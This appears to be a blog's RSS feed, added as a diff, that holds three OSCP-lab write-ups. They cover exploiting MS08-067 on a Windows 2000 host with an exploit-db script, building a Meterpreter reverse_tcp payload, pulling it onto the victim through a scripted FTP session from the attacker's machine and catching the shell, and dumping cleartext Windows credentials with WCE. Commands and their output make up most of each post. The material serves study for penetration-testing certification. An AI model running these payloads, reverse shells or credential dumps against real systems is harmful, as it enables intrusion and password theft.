@@ -1,0 +1,195 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on </title>
+    <link>/posts/</link>
+    <description>Recent content in Posts on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Fri, 05 Jun 2015 00:00:00 +0000</lastBuildDate>
+    <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Meterpreter up and running post exploitation</title>
+      <link>/posts/2015-06-05-Meterpreter-Post-Exploitation/</link>
+      <pubDate>Fri, 05 Jun 2015 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/2015-06-05-Meterpreter-Post-Exploitation/</guid>
+      <description>&lt;p&gt;I&amp;rsquo;ve exploited MS08-067 without metasploit.  After exploitation I use metasploit&amp;rsquo;s meterpreter.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;:  Start the ftp service on my attacking machine&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;service pure-ftpd start
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;:  Create a payload to connect back to my attacking machine&amp;rsquo;s listening meterpreter and save it to my ftp directory&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msfpayload windows/meterpreter/reverse_tcp lhost=192.168.30.36 lport=443 X &amp;gt; /ftphome/iambad.exe
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Victim&lt;/strong&gt;:  Exploit MS08-067 refer to&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://dmittakarin8.github.io/Exploiting-MS08067-wo-Metasploit/&#34;&gt;http://dmittakarin8.github.io/Exploiting-MS08067-wo-Metasploit/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Victim&lt;/strong&gt;:  FTP is installed on the server.  FTP is not interactive, so create a text file to pass to the ftp application.  I issue the following commands.  &lt;em&gt;Note the lack of spaces after the echo command&lt;/em&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;echo open 192.168.30.36&amp;gt; ftp.txt
+echo your_username&amp;gt;&amp;gt; ftp.txt
+echo your_password&amp;gt;&amp;gt; ftp.txt
+echo binary&amp;gt;&amp;gt; ftp.txt
+echo get iambad.exe&amp;gt;&amp;gt; ftp.txt
+echo bye&amp;gt;&amp;gt; ftp.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Victim&lt;/strong&gt;:  Execute the ftp command passing the ftp.txt as a parameter&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ftp -s:ftp.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;:  Start msfconsole on attacking machine&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msfconsole
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;:  Start multi/handler, set LHOST, set LPORT, and start handler&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf &amp;gt; use exploit/multi/handler
+msf exploit(handler) &amp;gt; set LHOST 192.168.30.36
+msf exploit(handler) &amp;gt; set LPORT 443
+msf exploit(handler) &amp;gt; run
+[*] Started reverse handler on 192.168.30.36:443 
+[*] Starting the payload handler...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Victim&lt;/strong&gt;:  Execute payload&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;iambad.exe
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;:  Meterpreter session obtained&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[*] Sending stage (770048 bytes) to 192.168.31.205
+[*] Meterpreter session 1 opened (192.168.30.36:443 -&amp;gt; 192.168.31.205:2707) at 2015-06-05 08:06:04 -0400
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploiting the MS08-067 vulnerability without Metasploit</title>
+      <link>/posts/2015-5-21-Exploiting-MS08067-wo-Metasploit/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/2015-5-21-Exploiting-MS08067-wo-Metasploit/</guid>
+      <description>&lt;p&gt;I&amp;rsquo;m currently enrolled in Offensive Security&amp;rsquo;s Penetration Testing with Kali Linux course with the intention of obtaining the OSCP Certification.  During the OSCP Certification Exam the use of Metasploit is limited, therefore I am not using it when exploiting the servers in the OSCP lab environment.&lt;br /&gt;
+Here are the steps I took to perform my first exploit - MS08-067 - without the use of Metasploit.&lt;/p&gt;
+
+&lt;p&gt;I targeted the Netbios service by using Nmap&amp;rsquo;s smb-check-vulns script on a Windows 2000 Server&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nmap returned the following&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;{{ site.baseurl }}/images/nmap-ms08067-vulnerable.png&#34; alt=&#34;_config.yml&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Searched exploit-db for an exploit and found the following&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;{{ site.baseurl }}/images/ms08067-exploitdb.png&#34; alt=&#34;_config.yml&#34; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cd ~/Projects/oscp/exploits
+wget https://www.exploit-db.com/download/7132 -O ms08-067.py
+chown 755 ms08-067.py
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The exploit code states that impacket and pycrypto are required.  Download impacket and pycrypto.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cd /opt/
+wget https://pypi.python.org/packages/source/i/impacket/impacket-0.9.13.tar.gz
+wget https://pypi.python.org/packages/source/p/pycrypto/pycrypto-2.6.1.tar.gz
+tar -xzf impacket-0.9.13.tar.gz
+tar -xzf pycrypto-2.6.1.tar.gz
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Need python dev tools installed in order to build pycrypto&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;apt-get install python-dev
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Change the permissions on the impacket folder and run setup&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cd impacket-0.9.13/
+./setup.py
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Change the permissions on the pycrypto folder and run setup&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cd ..
+cd pycrypto-2.6.1/ 
+python setup.py build
+python setup.py install
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Change the port # in the exploit code to the port # reported as vulnerable by Nmap earlier (i&amp;rsquo;m using Sublime Text)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cd ~/Projects/oscp/exploits
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;{{ site.baseurl }}/images/ms08067-exploitcodeportnumber.png&#34; alt=&#34;_config.yml&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Execute the exploit with the argument of 1 for Windows 2000&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;./ms08-067.py 192.168.31.205 1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Output of exploit states to connect to victim server using telnet on port 4444&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;{{ site.baseurl }}/images/ms08067-payload-sent.png&#34; alt=&#34;_config.yml&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Telnet to victim server&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;telnet 192.168.31.205 4444
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Shell obtained&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;{{ site.baseurl }}/images/ms08067-shellobtained.png&#34; alt=&#34;_config.yml&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>WCE post exploitation</title>
+      <link>/posts/2015-06-06-Using-WCE-to-dump-clear-text-passwords/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/2015-06-06-Using-WCE-to-dump-clear-text-passwords/</guid>
+      <description>&lt;p&gt;Download wce&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cd /opt/
+wget http://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
+unzip wce_v1_41beta_universal.zip -d wce
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Victim&lt;/strong&gt;:  With ftp server running on attacking box.  Upload wce.exe to victim&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;echo open 192.168.30.36&amp;gt; ftp.txt
+echo your_username&amp;gt;&amp;gt; ftp.txt
+echo your_password&amp;gt;&amp;gt; ftp.txt
+echo binary&amp;gt;&amp;gt; ftp.txt
+echo get wce.exe&amp;gt;&amp;gt; ftp.txt
+echo bye&amp;gt;&amp;gt; ftp.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Victim&lt;/strong&gt;:  Execute wce.  Administrator password displayed in the clear.  (real password masked just in case any potential oscp students are actually reading this)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;C:\Documents and Settings\Administrator\My Documents&amp;gt;wce -w
+wce -w
+WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security -     by Hernan Ochoa (hernan@ampliasecurity.com)
+Use -h for help.
+
+Administrator\RALPH:&amp;lt;password&amp;gt;
+RALPH$\THINC.LOCAL:
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
